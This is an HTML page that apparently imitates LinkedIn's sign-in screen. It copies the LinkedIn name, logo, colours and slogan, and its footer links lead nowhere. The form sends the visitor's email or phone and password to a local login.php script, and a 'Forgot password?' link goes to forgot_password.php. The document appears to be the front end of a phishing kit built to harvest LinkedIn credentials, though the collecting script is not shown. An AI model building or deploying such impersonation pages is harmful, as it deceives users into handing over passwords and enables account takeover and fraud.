<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400..700;1,400..700&display=swap" rel="stylesheet">
    <title>LinkedIn Login</title>
    <style>
        body {
            font-family: "Arimo", sans-serif;
            background-color: #f5f5f5;
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
            position: relative; /* Set position to relative for containing the absolutely positioned logo */
        }


        .container {
            max-width: 300px;
            margin: 100px auto;
            padding: 135px 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        img.logo {
            position: relative; /* Position the image absolutely */
            top: 10px; /* Distance from top */
            left: 55px; /* Distance from left */
            width: 115px; /* Adjust the width to make it bigger */
            height: auto; /* Maintain aspect ratio */
        }

        h2 {
            font-size: 35px;
            color: #262626;
            font-family: "Arimo", sans-serif; /* Change font to Arimo */
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none; /* Remove default outline */
            border: 1px solid black; /* Add black border */
        }

        input[type="submit"],
        .social-button {
            font-size: 15px;
            font-weight: bold;
            width: 100%;
            padding: 20px;
            margin-bottom: 10px;
            border: none;
            border-radius: 25px; /* Make the button oval */
            cursor: pointer;
            background-color: #0077b5;
            color: #fff;
        }

        input[type="submit"]:hover {
            background-color: #005f91;
        }

        .subtext {
            margin-top: -20px; /* Adjust the margin to move the text closer */
            margin-bottom: 30px;
            font-size: 14px;
            color: #262626;
            font-family: "Arimo", sans-serif; /* Change font to Arimo */
        }

        /* Style for the forgot password link */
        .forgot-password {
            margin-bottom: 20px;
            font-size: 15px;
            text-align: left;
            color: #0077b5; /* LinkedIn blue color */
            text-decoration: none; /* Remove underline */
            display: block; /* Make it a block element for proper positioning */
            font-family: "Arimo", sans-serif;
            font-weight: bold; /* Make the text bold */
        }

        /* Footer styles */
        footer {
            position: fixed;
            bottom: 20px;
            left: 0;
            width: 100%;
            padding: 10px 0;
            text-align: center;
            font-size: 15px;
            font-weight: bold;
            color: #999; /* Light gray color */
        }

        footer img {
            width: 50px;
            vertical-align: middle;
            text-decoration: none;
            margin: 0 5px;
        }

        footer a {
            color: #0077b5; /* LinkedIn blue color */
            text-decoration: none; /* Remove underline */
            margin: 0 5px; /* Add some margin between links */
        }
    </style>
</head>

<body>
    <img src="https://th.bing.com/th/id/OIP.7y88DqLREW8ApbxWuMBmzgHaEo?rs=1&pid=ImgDetMain" alt="LinkedIn Logo" class="logo">
    <div class="container">
        <h2>Sign in</h2>
        <p class="subtext">Stay updated on your professional world</p>
        <form action="login.php" method="post">
            <input type="text" name="email" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <!-- Forgot password link -->
            <a href="forgot_password.php" class="forgot-password">Forgot password?</a>
            <!-- Customized sign-in button text -->
            <input type="submit" value="Sign In">
        </form>
    </div>
    <!-- Footer -->
    <footer>
        <img src="https://logodix.com/logo/558822.jpg" alt="Footer Image">  <a href="#">User Agreement</a>  <a href="#">Privacy Policy</a>  <a href="#">Community Guidelines</a>  <a href="#">Cookie Policy</a>  <a href="#">Copyright Policy</a>  <a href="#">Send Feedback</a>   <a href="#">Language</a>
    </footer>
</body>

</html>
